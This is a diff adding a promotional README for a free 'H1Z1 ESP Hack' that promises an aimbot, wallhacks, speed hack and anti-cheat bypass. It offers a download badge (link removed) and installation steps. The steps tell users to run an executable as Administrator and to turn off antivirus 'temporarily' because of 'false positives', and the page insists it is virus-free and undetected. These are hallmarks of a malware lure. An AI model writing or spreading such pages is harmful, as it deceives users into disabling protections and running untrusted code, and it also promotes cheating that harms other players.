@@ -1,0 +1,65 @@
+# H1Z1 ESP Hack 2025 - Free Download for Windows
+
+[![Version](https://img.shields.io/badge/Version-2025-blue?logo=windows)](https://windows.com) [![License](https://img.shields.io/badge/License-Free-green?logo=github)](https://opensource.org/licenses) [![Platform](https://img.shields.io/badge/Platform-Windows-red?logo=windows)](https://windows.com) [![Status](https://img.shields.io/badge/Status-Active-brightgreen?logo=azure-devops)](https://azure.com)  
+
+🎮 **The Ultimate H1Z1 Hack Tool - Free & Undetected for 2025!** 🎮  
+
+🔥 **Dominate the battlefield with our premium H1Z1 hack**, featuring **Aimbot, ESP, Wallhacks, and more**—completely **FREE** and **undetected**! 🔥  
+
+---
+
+## 🚀 **Features**  
+✔ **Aimbot** - **Pixel-perfect** targeting with customizable FOV and smoothness!  
+✔ **ESP** - See **enemies, loot, and vehicles** through walls with **color-coded visuals**!  
+✔ **No Recoil** - **Laser-beam accuracy** with zero recoil on all weapons!  
+✔ **Speed Hack** - Move faster than ever with customizable speed boosts!  
+✔ **Radar Hack** - **Minimap enhancement** showing all player positions!  
+✔ **Undetected** - **100% safe** with **daily updates** to bypass anti-cheat!  
+
+---
+
+## 📥 **Download Now!**  
+[![Download](https://img.shields.io/badge/Download-H1Z1_Hack_2025-ff69b4?logo=steam)]([LINK])  
+
+---
+
+## 🛠 **Installation Guide**  
+1️⃣ **Download** the hack using the button above.  
+2️⃣ **Extract** the `.zip` file to a **secure folder**.  
+3️⃣ **Run** `H1Z1_Hack_Launcher.exe` as **Administrator**.  
+4️⃣ **Launch H1Z1** and enjoy **DOMINATING**! 🎯  
+
+⚠ **Note**: Disable antivirus **temporarily** (false positives) and **always run as Admin**!  
+
+---
+
+## 🔒 **Safety & Updates**  
+✅ **Daily Updates** - Our team ensures the hack stays **undetected**!  
+✅ **Secure Injection** - Uses **advanced memory masking** to avoid bans!  
+✅ **Virus-Free** - **No malware**, **no spyware**, just pure performance!  
+
+---
+
+## ❓ **FAQ**  
+❔ **Is this really free?**  
+👉 **YES!** No hidden payments—**100% free forever**!  
+
+❔ **Will I get banned?**  
+👉 **No!** We use **advanced bypass techniques** to ensure safety.  
+
+❔ **When is the next update?**  
+👉 **Daily!** Check back often for the **latest features**!  
+
+---
+
+## 📜 **Disclaimer**  
+This tool is for **educational purposes only**. Use at your own risk. We are **not responsible** for any bans or misuse.  
+
+---
+
+## 🌟 **Star This Repo!**  
+If you love this hack, **give us a ⭐** and share with friends!  
+
+[![GitHub Stars](https://img.shields.io/github/stars/username/repo?style=social)](https://github.com/username/repo)  
+
+**Happy Hacking!** 🚀🔥
